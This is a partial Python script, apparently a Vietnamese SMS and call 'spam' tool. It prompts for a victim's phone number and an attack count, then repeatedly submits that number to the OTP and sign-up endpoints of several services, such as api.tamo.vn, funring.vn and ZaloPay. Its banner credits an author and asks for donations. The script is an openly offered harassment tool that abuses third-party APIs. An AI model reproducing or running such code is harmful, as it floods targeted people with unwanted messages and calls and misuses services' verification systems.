...
banner()
amount = 5000
print(style.HEADER+'[=] SPAM SMS + CALL BY Thai Duong?')
print(style.BLUE+'---------------------------------------')
print(style.RED+'[+] Admin : Thai Duong?')
print(style.RED+'[+] Zalo : 0349269328 ')
print(style.BLUE+'---------------------------------------')
...
while not re.search("^(0?)(3[2-9]|5[6|8|9]|7[0|6-9]|8[0-6|8|9]|9[0-4|6-9])[0-9]{7}$",sdt):
  print(style.GREEN+"- Phải đủ 10 số ông êii !!")
  print(style.BLUE+'---------------------------------------')
  sdt = input(style.GREEN+"- Nhập số điện thoại nạn nhân : ")
  print(style.BLUE+'---------------------------------------')
count = int(input(style.GREEN+"- ATTACK NUMBER : "))
...
def tamo(phone):
  data = '{"mobilePhone":{"number":"sdt"}}'.replace("sdt",phone)
  head = {
    "Host":"api.tamo.vn",
...
def funring(phone):
  data ='{"username": "sdt"}'.replace("sdt",phone)
  head = {
    "Host":"funring.vn",
...
def zlpay(phone):
    ...
    json_data = {'phone_number': "0"+sdt[1:11],'send_otp_token': token}
...
def run(sdt,i):                  
  ...
  print(style.BLUE+'----------------------------------------------------------')
  for j in range(0, 5):
    print(f"Dung 1 giay roi thi hay nho donate Thai Duong 1k nhe=)",end="\r")
